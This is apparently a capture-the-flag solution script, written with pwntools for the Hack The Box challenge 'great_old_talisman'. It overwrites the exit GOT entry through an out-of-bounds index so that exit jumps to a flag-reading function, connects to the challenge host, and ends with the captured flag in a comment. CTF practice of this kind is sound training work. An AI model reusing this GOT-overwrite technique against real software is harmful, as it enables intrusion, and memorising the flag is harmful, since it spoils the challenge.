from pwn import *

read_flag = 0x40135a
talis = 0x4040a0
exit_got = 0x404080
loc = (exit_got - talis) // 8

r = process('./great_old_talisman')
r = remote('83.136.249.230',54587)
#gdb.attach(r)
print("Location: ", loc)
r.sendlineafter(">> ", str(loc))
r.sendafter("Spell: ", b'\x5a\x13')
r.interactive()

# flag: HTB{t4l15m4n_G0T_ur_b4ck}
